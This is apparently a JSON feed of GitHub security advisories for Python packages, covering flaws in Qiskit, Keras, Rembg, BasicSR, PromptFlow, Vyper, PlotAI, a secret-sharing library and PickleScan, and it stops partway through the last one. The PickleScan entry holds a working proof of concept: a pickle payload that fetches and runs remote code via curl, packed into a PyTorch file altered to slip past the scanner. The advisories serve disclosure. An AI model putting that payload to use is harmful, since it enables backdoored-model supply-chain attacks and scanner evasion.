{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A maliciously crafted QPY file containing can potentially execute arbitrary-code embedded in the payload without privilege escalation when deserializing QPY formats &lt; 13. A python process calling Qiskit's <code>qiskit.qpy.load()</code> function could potentially execute any arbitrary Python code embedded in the correct place in the binary file as part of specially constructed payload.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in Qiskit 1.4.2 and in Qiskit 2.0.0rc2</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Qiskit/qiskit/security/advisories/GHSA-6m2c-76ff-6vrf\">https://github.com/Qiskit/qiskit/security/advisories/GHSA-6m2c-76ff-6vrf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-2000\">https://nvd.nist.gov/vuln/detail/CVE-2025-2000</a></li>\n<li><a href=\"https://www.ibm.com/support/pages/node/7185949\">https://www.ibm.com/support/pages/node/7185949</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6m2c-76ff-6vrf\">https://github.com/advisories/GHSA-6m2c-76ff-6vrf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6m2c-76ff-6vrf",
            "title": "[qiskit] Qiskit allows arbitrary code execution decoding QPY format versions < 13",
            "date_modified": "2025-03-14T19:56:15.000Z",
            "date_published": "2025-03-14T19:56:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6m2c-76ff-6vrf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A maliciously crafted QPY file containing can potentially execute arbitrary-code embedded in the payload without privilege escalation when deserializing QPY formats &lt; 13. A python process calling Qiskit's <code>qiskit.qpy.load()</code> function could potentially execute any arbitrary Python code embedded in the correct place in the binary file as part of specially constructed payload.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in Qiskit 1.4.2 and in Qiskit 2.0.0rc2</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Qiskit/qiskit/security/advisories/GHSA-6m2c-76ff-6vrf\">https://github.com/Qiskit/qiskit/security/advisories/GHSA-6m2c-76ff-6vrf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-2000\">https://nvd.nist.gov/vuln/detail/CVE-2025-2000</a></li>\n<li><a href=\"https://www.ibm.com/support/pages/node/7185949\">https://www.ibm.com/support/pages/node/7185949</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6m2c-76ff-6vrf\">https://github.com/advisories/GHSA-6m2c-76ff-6vrf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6m2c-76ff-6vrf",
            "title": "[qiskit-terra] Qiskit allows arbitrary code execution decoding QPY format versions < 13",
            "date_modified": "2025-03-14T19:56:15.000Z",
            "date_published": "2025-03-14T19:56:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6m2c-76ff-6vrf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"duplicate-advisory\">Duplicate Advisory</h1>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-6m2c-76ff-6vrf. This link is maintained to preserve external references.</p>\n<h1 id=\"original-description\">Original Description</h1>\n<p>A maliciously crafted QPY file can potential execute arbitrary-code embedded in the payload without privilege escalation when deserialising QPY formats &lt; 13. A python process calling Qiskit 0.18.0 through 1.4.1's <code>qiskit.qpy.load()</code> function could potentially execute any arbitrary Python code embedded in the correct place in the binary file as part of specially constructed payload.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-2000\">https://nvd.nist.gov/vuln/detail/CVE-2025-2000</a></li>\n<li><a href=\"https://www.ibm.com/support/pages/node/7185949\">https://www.ibm.com/support/pages/node/7185949</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3pwp-2fqj-6g2p\">https://github.com/advisories/GHSA-3pwp-2fqj-6g2p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3pwp-2fqj-6g2p",
            "title": "[qiskit] Duplicate Advisory: Qiskit allows arbitrary code execution decoding QPY format versions < 13",
            "date_modified": "2025-03-14T19:56:02.000Z",
            "date_published": "2025-03-14T15:32:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3pwp-2fqj-6g2p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Description:</strong></p>\n<p>The <code>secure_redundant_execution</code> function in feldman_vss.py attempts to mitigate fault injection attacks by executing a function multiple times and comparing results. However, several critical weaknesses exist:</p>\n<ol>\n<li>Python's execution environment cannot guarantee true isolation between redundant executions</li>\n<li>The constant-time comparison implementation in Python is subject to timing variations</li>\n<li>The randomized execution order and timing provide insufficient protection against sophisticated fault attacks</li>\n<li>The error handling may leak timing information about partial execution results</li>\n</ol>\n<p>These limitations make the protection ineffective against targeted fault injection attacks, especially from attackers with physical access to the hardware.</p>\n<p><strong>Impact:</strong></p>\n<p>A successful fault injection attack could allow an attacker to:</p>\n<ol>\n<li>Bypass the redundancy check mechanisms</li>\n<li>Extract secret polynomial coefficients during share generation or verification</li>\n<li>Force the acceptance of invalid shares during verification</li>\n<li>Manipulate the commitment verification process to accept fraudulent commitments</li>\n</ol>\n<p>This undermines the core security guarantees of the Verifiable Secret Sharing scheme.</p>\n<p><strong>References:</strong></p>\n<ul>\n<li>File: <code>feldman_vss.py</code></li>\n<li>Function: <code>secure_redundant_execution</code></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Fault_attack\">Fault Attacks</a> - Wikipedia article on fault attacks.</li>\n<li>Bar-El, H., et al. \"The Sorcerer's Apprentice Guide to Fault Attacks\" - <a href=\"https://eprint.iacr.org/2004/100.pdf\">https://eprint.iacr.org/2004/100.pdf</a></li>\n<li>CWE-1279: <a href=\"https://cwe.mitre.org/data/definitions/1279.html\">https://cwe.mitre.org/data/definitions/1279.html</a></li>\n<li>NIST SP 800-90B section on implementation validation</li>\n</ul>\n<p><strong>Remediation:</strong></p>\n<p>Long-term remediation requires reimplementing the security-critical functions in a lower-level language like Rust.</p>\n<p>Short-term mitigations:</p>\n<ol>\n<li>Deploy the software in environments with physical security controls</li>\n<li>Increase the redundancy count (from 5 to a higher number) by modifying the source code</li>\n<li>Add external verification of cryptographic operations when possible</li>\n<li>Consider using hardware security modules (HSMs) for key operations</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/DavidOsipov/PostQuantum-Feldman-VSS/security/advisories/GHSA-r8gc-qc2c-c7vh\">https://github.com/DavidOsipov/PostQuantum-Feldman-VSS/security/advisories/GHSA-r8gc-qc2c-c7vh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29779\">https://nvd.nist.gov/vuln/detail/CVE-2025-29779</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Fault_attack\">https://en.wikipedia.org/wiki/Fault_attack</a></li>\n<li><a href=\"https://eprint.iacr.org/2004/100.pdf\">https://eprint.iacr.org/2004/100.pdf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r8gc-qc2c-c7vh\">https://github.com/advisories/GHSA-r8gc-qc2c-c7vh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r8gc-qc2c-c7vh",
            "title": "[PostQuantum-Feldman-VSS] Post-Quantum Secure Feldman's Verifiable Secret Sharing has Inadequate Fault Injection Countermeasures in `secure_redundant_execution`",
            "date_modified": "2025-03-14T19:55:19.000Z",
            "date_published": "2025-03-14T19:55:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r8gc-qc2c-c7vh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Description:</strong></p>\n<p>The <code>feldman_vss</code> library contains timing side-channel vulnerabilities in its matrix operations, specifically within the <code>_find_secure_pivot</code> function and potentially other parts of <code>_secure_matrix_solve</code>. These vulnerabilities are due to Python's execution model, which does not guarantee constant-time execution. An attacker with the ability to measure the execution time of these functions (e.g., through repeated calls with carefully crafted inputs) could potentially recover secret information used in the Verifiable Secret Sharing (VSS) scheme.</p>\n<p>The <code>_find_secure_pivot</code> function, used during Gaussian elimination in <code>_secure_matrix_solve</code>, attempts to find a non-zero pivot element. However, the conditional statement <code>if matrix[row][col] != 0 and row_random &lt; min_value:</code> has execution time that depends on the value of <code>matrix[row][col]</code>. This timing difference can be exploited by an attacker.</p>\n<p>The <code>constant_time_compare</code> function in this file also does not provide a constant-time guarantee.</p>\n<p>This advisory formalizes the timing side-channel vulnerabilities already documented in the library's \"Known Security Vulnerabilities\" section. The Python implementation of matrix operations in the _find_secure_pivot and _secure_matrix_solve functions cannot guarantee constant-time execution, potentially leaking information about secret polynomial coefficients.</p>\n<p>An attacker with the ability to make precise timing measurements of these operations could potentially extract secret information through statistical analysis of execution times, though practical exploitation would require significant expertise and controlled execution environments.</p>\n<p><strong>Impact:</strong></p>\n<p>Successful exploitation of these timing side-channels could allow an attacker to recover secret keys or other sensitive information protected by the VSS scheme.  This could lead to a complete compromise of the shared secret.</p>\n<p><strong>References:</strong></p>\n<ul>\n<li>File: <code>feldman_vss.py</code></li>\n<li>Function: <code>_find_secure_pivot</code></li>\n<li>Function: <code>_secure_matrix_solve</code></li>\n<li>Function: <code>constant_time_compare</code></li>\n<li><a href=\"https://www.rambus.com/wp-content/uploads/2015/08/TimingAttacks.pdf\">Timing Attacks on Implementations of Diffie-Hellman, RSA, DSS, and Other Systems (1996)</a> - A seminal paper on timing attacks.</li>\n<li><a href=\"https://en.wikipedia.org/wiki/Side-channel_attack\">Side-Channel Attacks</a> - Wikipedia article on side-channel attacks.</li>\n</ul>\n<p><strong>Remediation:</strong></p>\n<p>As acknowledged in the library's documentation, these vulnerabilities cannot be adequately addressed in pure Python. The advisory recommends:</p>\n<ol>\n<li><p>SHORT TERM: Consider using this library only in environments where timing measurements by attackers are infeasible.</p>\n</li>\n<li><p>MEDIUM TERM: Implement your own wrappers around critical operations using constant-time libraries in languages like Rust, Go, or C.</p>\n</li>\n<li><p>LONG TERM: Wait for the planned Rust implementation mentioned in the library documentation that will properly address these issues.</p>\n</li>\n</ol>\n<p>Note that the usage of random.Random() identified in the _refresh_shares_additive function is intentional and secure as documented in the \"False-Positive Vulnerabilities\" section of the code, and should not be considered part of this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/DavidOsipov/PostQuantum-Feldman-VSS/security/advisories/GHSA-q65w-fg65-79f4\">https://github.com/DavidOsipov/PostQuantum-Feldman-VSS/security/advisories/GHSA-q65w-fg65-79f4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-29780\">https://nvd.nist.gov/vuln/detail/CVE-2025-29780</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Side-channel_attack\">https://en.wikipedia.org/wiki/Side-channel_attack</a></li>\n<li><a href=\"https://www.rambus.com/wp-content/uploads/2015/08/TimingAttacks.pdf\">https://www.rambus.com/wp-content/uploads/2015/08/TimingAttacks.pdf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q65w-fg65-79f4\">https://github.com/advisories/GHSA-q65w-fg65-79f4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q65w-fg65-79f4",
            "title": "[PostQuantum-Feldman-VSS] Post-Quantum Secure Feldman's Verifiable Secret Sharing has Timing Side-Channels in Matrix Operations",
            "date_modified": "2025-03-14T19:55:11.000Z",
            "date_published": "2025-03-14T19:55:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q65w-fg65-79f4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>XPixelGroup BasicSR through 1.4.2 might locally allow code execution in contrived situations where \"scontrol show hostname\" is executed in the presence of a crafted SLURM_NODELIST environment variable.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27763\">https://nvd.nist.gov/vuln/detail/CVE-2024-27763</a></li>\n<li><a href=\"https://gist.github.com/aydinnyunus/40e1d8a3b529261ae654ff4891f1e192\">https://gist.github.com/aydinnyunus/40e1d8a3b529261ae654ff4891f1e192</a></li>\n<li><a href=\"https://github.com/XPixelGroup/BasicSR/blob/master/basicsr/utils/dist_util.py#L44\">https://github.com/XPixelGroup/BasicSR/blob/master/basicsr/utils/dist_util.py#L44</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-86w8-vhw6-q9qq\">https://github.com/advisories/GHSA-86w8-vhw6-q9qq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-86w8-vhw6-q9qq",
            "title": "[basicsr] XPixelGroup BasicSR Command Injection",
            "date_modified": "2025-03-13T16:25:47.000Z",
            "date_published": "2025-03-12T15:32:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-86w8-vhw6-q9qq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Rembg is a tool to remove images background. In Rembg 2.0.57 and earlier, the CORS middleware is setup incorrectly. All origins are reflected, which allows any website to send cross site requests to the rembg server and thus query any API. Even if authentication were to be enabled, allow_credentials is set to True, which would allow any website to send authenticated cross site requests.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25302\">https://nvd.nist.gov/vuln/detail/CVE-2025-25302</a></li>\n<li><a href=\"https://github.com/danielgatis/rembg/blob/d1e00734f8a996abf512a3a5c251c7a9a392c90a/rembg/commands/s_command.py#L93\">https://github.com/danielgatis/rembg/blob/d1e00734f8a996abf512a3a5c251c7a9a392c90a/rembg/commands/s_command.py#L93</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2024-161_GHSL-2024-162_rembg\">https://securitylab.github.com/advisories/GHSL-2024-161_GHSL-2024-162_rembg</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-59qh-fmm7-3g9q\">https://github.com/advisories/GHSA-59qh-fmm7-3g9q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-59qh-fmm7-3g9q",
            "title": "[rembg] Rembg CORS misconfiguration",
            "date_modified": "2025-03-11T21:32:44.000Z",
            "date_published": "2025-03-11T21:32:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-59qh-fmm7-3g9q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Rembg is a tool to remove images background. In Rembg 2.0.57 and earlier, the /api/remove endpoint takes a URL query parameter that allows an image to be fetched, processed and returned. An attacker may be able to query this endpoint to view pictures hosted on the internal network of the rembg server. This issue may lead to Information Disclosure.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25301\">https://nvd.nist.gov/vuln/detail/CVE-2025-25301</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2024-161_GHSL-2024-162_rembg\">https://securitylab.github.com/advisories/GHSL-2024-161_GHSL-2024-162_rembg</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5gx-c49x-h878\">https://github.com/advisories/GHSA-r5gx-c49x-h878</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5gx-c49x-h878",
            "title": "[rembg] Rembg allows SSRF via /api/remove",
            "date_modified": "2025-03-11T21:31:03.000Z",
            "date_published": "2025-03-11T21:31:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5gx-c49x-h878"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Improper isolation or compartmentalization in Azure PromptFlow allows an unauthorized attacker to execute code over a network.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24986\">https://nvd.nist.gov/vuln/detail/CVE-2025-24986</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24986\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24986</a></li>\n<li><a href=\"https://github.com/microsoft/promptflow/commit/5f4a41ab4cb15607ade7f26138b0b863b4e4eb0a\">https://github.com/microsoft/promptflow/commit/5f4a41ab4cb15607ade7f26138b0b863b4e4eb0a</a></li>\n<li><a href=\"https://github.com/microsoft/promptflow/commit/625061724c51533d28fe6e0e3014b1042afdb07f\">https://github.com/microsoft/promptflow/commit/625061724c51533d28fe6e0e3014b1042afdb07f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gprr-v9f2-px3c\">https://github.com/advisories/GHSA-gprr-v9f2-px3c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gprr-v9f2-px3c",
            "title": "[promptflow-core] Azure PromptFlow remote code execution related to Jinja templates",
            "date_modified": "2025-03-11T20:19:56.000Z",
            "date_published": "2025-03-11T18:32:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gprr-v9f2-px3c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Improper isolation or compartmentalization in Azure PromptFlow allows an unauthorized attacker to execute code over a network.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24986\">https://nvd.nist.gov/vuln/detail/CVE-2025-24986</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24986\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24986</a></li>\n<li><a href=\"https://github.com/microsoft/promptflow/commit/5f4a41ab4cb15607ade7f26138b0b863b4e4eb0a\">https://github.com/microsoft/promptflow/commit/5f4a41ab4cb15607ade7f26138b0b863b4e4eb0a</a></li>\n<li><a href=\"https://github.com/microsoft/promptflow/commit/625061724c51533d28fe6e0e3014b1042afdb07f\">https://github.com/microsoft/promptflow/commit/625061724c51533d28fe6e0e3014b1042afdb07f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gprr-v9f2-px3c\">https://github.com/advisories/GHSA-gprr-v9f2-px3c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gprr-v9f2-px3c",
            "title": "[promptflow-tools] Azure PromptFlow remote code execution related to Jinja templates",
            "date_modified": "2025-03-11T20:19:56.000Z",
            "date_published": "2025-03-11T18:32:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gprr-v9f2-px3c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Keras <code>Model.load_model</code> function permits arbitrary code execution, even with <code>safe_mode=True</code>, through a manually constructed, malicious <code>.keras</code> archive. By altering the <code>config.json</code> file within the archive, an attacker can specify arbitrary Python modules and functions, along with their arguments, to be loaded and executed during model loading.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This problem is fixed starting with version <code>3.9</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Only load models from trusted sources and model archives created with Keras.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://www.cve.org/cverecord?id=CVE-2025-1550\">https://www.cve.org/cverecord?id=CVE-2025-1550</a></li>\n<li><a href=\"https://github.com/keras-team/keras/pull/20751\">https://github.com/keras-team/keras/pull/20751</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/keras-team/keras/security/advisories/GHSA-48g7-3x6r-xfhp\">https://github.com/keras-team/keras/security/advisories/GHSA-48g7-3x6r-xfhp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1550\">https://nvd.nist.gov/vuln/detail/CVE-2025-1550</a></li>\n<li><a href=\"https://github.com/keras-team/keras/pull/20751\">https://github.com/keras-team/keras/pull/20751</a></li>\n<li><a href=\"https://github.com/keras-team/keras/commit/e67ac8ffd0c883bec68eb65bb52340c7f9d3a903\">https://github.com/keras-team/keras/commit/e67ac8ffd0c883bec68eb65bb52340c7f9d3a903</a></li>\n<li><a href=\"https://github.com/keras-team/keras/releases/tag/v3.9.0\">https://github.com/keras-team/keras/releases/tag/v3.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-48g7-3x6r-xfhp\">https://github.com/advisories/GHSA-48g7-3x6r-xfhp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-48g7-3x6r-xfhp",
            "title": "[keras] Arbitrary Code Execution via Crafted Keras Config for Model Loading",
            "date_modified": "2025-03-11T20:07:33.000Z",
            "date_published": "2025-03-11T20:07:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-48g7-3x6r-xfhp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>For the following (probably non-exhaustive) list of expressions, the compiler evaluates the arguments from right to left instead of left to right.</p>\n<pre><code>- unsafe_add\n- unsafe_sub\n- unsafe_mul\n- unsafe_div\n- pow_mod256\n- |, &amp;, ^ (bitwise operators)\n- bitwise_or (deprecated)\n- bitwise_and (deprecated)\n- bitwise_xor (deprecated)\n- raw_call\n- &lt;, &gt;, &lt;=, &gt;=, ==, !=\n- in, not in (when lhs and rhs are enums)\n</code></pre>\n<p>This behaviour becomes a problem when the evaluation of one of the arguments produces side effects that other arguments depend on. The following expressions can produce side-effect:</p>\n<ul>\n<li>state modifying external call </li>\n<li>state modifying internal call</li>\n<li><code>raw_call</code></li>\n<li><code>pop()</code> when used on a Dynamic Array stored in the storage</li>\n<li><code>create_minimal_proxy_to</code></li>\n<li><code>create_copy_of</code></li>\n<li><code>create_from_blueprint</code></li>\n</ul>\n<p>For example:</p>\n<pre><code class=\"language-Vyper\">f:uint256\n\n@internal\ndef side_effect() -&gt; uint256:\n    self.f = 12\n    return 1\n\n@external\ndef foo() -&gt; uint256:\n    return unsafe_add(self.f,self.side_effect()) # returns 13 instead of 1\n</code></pre>\n<pre><code class=\"language-Vyper\">a:DynArray[uint256, 12]\n@external\ndef bar() -&gt; bool:\n    self.a = [1,2,3]\n    return len(self.a) == self.a.pop() # return false instead of true\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>not yet patched, will address in a future release. tracking in <a href=\"https://github.com/vyperlang/vyper/issues/3604\">https://github.com/vyperlang/vyper/issues/3604</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>When using expressions from the list above, make sure that the arguments of the expression do not produce side effects or, if one does, that no other argument is dependent on those side effects.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-g2xh-c426-v8mf\">https://github.com/vyperlang/vyper/security/advisories/GHSA-g2xh-c426-v8mf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-40015\">https://nvd.nist.gov/vuln/detail/CVE-2023-40015</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2023-167.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2023-167.yaml</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/issues/3604\">https://github.com/vyperlang/vyper/issues/3604</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/issues/4019\">https://github.com/vyperlang/vyper/issues/4019</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/pull/4157\">https://github.com/vyperlang/vyper/pull/4157</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g2xh-c426-v8mf\">https://github.com/advisories/GHSA-g2xh-c426-v8mf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g2xh-c426-v8mf",
            "title": "[vyper] Vyper: reversed order of side effects for some operations",
            "date_modified": "2025-03-11T17:05:34.000Z",
            "date_published": "2023-09-04T16:39:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g2xh-c426-v8mf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"duplicate-advisory\">Duplicate Advisory</h1>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-48g7-3x6r-xfhp. This link is maintained to preserve external references.</p>\n<h1 id=\"original-description\">Original Description</h1>\n<p>The Keras Model.load_model function permits arbitrary code execution, even with safe_mode=True, through a manually constructed, malicious .keras archive. By altering the config.json file within the archive, an attacker can specify arbitrary Python modules and functions, along with their arguments, to be loaded and executed during model loading.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1550\">https://nvd.nist.gov/vuln/detail/CVE-2025-1550</a></li>\n<li><a href=\"https://github.com/keras-team/keras/pull/20751\">https://github.com/keras-team/keras/pull/20751</a></li>\n<li><a href=\"https://github.com/keras-team/keras/commit/e67ac8ffd0c883bec68eb65bb52340c7f9d3a903\">https://github.com/keras-team/keras/commit/e67ac8ffd0c883bec68eb65bb52340c7f9d3a903</a></li>\n<li><a href=\"https://github.com/keras-team/keras/releases/tag/v3.9.0\">https://github.com/keras-team/keras/releases/tag/v3.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5478-v2w6-c6q7\">https://github.com/advisories/GHSA-5478-v2w6-c6q7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5478-v2w6-c6q7",
            "title": "[keras] Duplicate Advisory: Keras arbitrary code execution vulnerability",
            "date_modified": "2025-03-11T20:07:24.000Z",
            "date_published": "2025-03-11T09:30:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5478-v2w6-c6q7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability, that could result in Remote Code Execution (RCE), has been found in PlotAI. Lack of validation of LLM-generated output allows attacker to execute arbitrary Python code. PlotAI commented out vulnerable line, further usage of the software requires uncommenting it and thus accepting the risk.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1497\">https://nvd.nist.gov/vuln/detail/CVE-2025-1497</a></li>\n<li><a href=\"https://github.com/mljar/plotai/commit/bdcfb13484f0b85703a4c1ddfd71cb21840e7fde\">https://github.com/mljar/plotai/commit/bdcfb13484f0b85703a4c1ddfd71cb21840e7fde</a></li>\n<li><a href=\"https://cert.pl/en/posts/2025/03/CVE-2025-1497\">https://cert.pl/en/posts/2025/03/CVE-2025-1497</a></li>\n<li><a href=\"https://cert.pl/posts/2025/03/CVE-2025-1497\">https://cert.pl/posts/2025/03/CVE-2025-1497</a></li>\n<li><a href=\"https://github.com/mljar/plotai\">https://github.com/mljar/plotai</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2hmp-5wqg-f24h\">https://github.com/advisories/GHSA-2hmp-5wqg-f24h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2hmp-5wqg-f24h",
            "title": "[plotai] PlotAI eval vulnerability",
            "date_modified": "2025-03-10T22:21:13.000Z",
            "date_published": "2025-03-10T15:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2hmp-5wqg-f24h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>PickleScan is vulnerable to a ZIP archive manipulation attack that causes it to crash when attempting to extract and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping the original filename in the directory listing, an attacker can make PickleScan raise a BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the model to be loaded, enabling malicious payloads to bypass detection.</p>\n<h3 id=\"details\">Details</h3>\n<p>Python's built-in zipfile module performs strict integrity checks when extracting ZIP files. If a filename stored in the ZIP header does not match the filename in the directory listing, zipfile.ZipFile.open() raises a BadZipFile error. PickleScan relies on zipfile to extract and inspect the contents of PyTorch model archives, making it susceptible to this manipulation.</p>\n<p>PyTorch, on the other hand, has a more tolerant ZIP handling mechanism that ignores these discrepancies, allowing the model to load even when PickleScan fails. An attacker can exploit this behavior to embed a malicious pickle file inside a model archive, which PyTorch will load, while preventing PickleScan from scanning the archive.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>import os\nimport torch\n\nclass RemoteCodeExecution:\n    def __reduce__(self):\n        return os.system, (f\"eval \\\"$(curl -s http://localhost:8080)\\\"\",)\n\n\nmodel = RemoteCodeExecution()\nfile = \"does_not_scan_but_opens_in_torch.pth\"\ntorch.save(model, file)\n\n# modify the header to cause the zip file to raise execution in picklescan\nwith open(file, \"rb\") as f:\n    data = f.read()\n\n# Replace only the first occurrence of \"data.pkl\" with \"datap.kl\"\nmodified_data = data.replace(b\"data.pkl\", b\"datap.kl\", 1)\n\n# Write back the modified content\nwith open(file, \"wb\") as f:\n    f.write(modified_data)\n\n# Load the infected model\ntorch.load(file)  \n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Severity: <code>High</code></p>\n<ul>\n<li><p>Who is impacted? Any organization or individual using PickleScan to detect malicious pickle files in PyTorch models.</p>\n</li>\n<li><p>What is the impact? Attackers can embed malicious payloads inside PyTorch model archives while preventing PickleScan from scanning them.</p>\n</li>\n<li><p>Potential Exploits: This technique can be used in supply chain attacks to distribute backdoored models via platforms 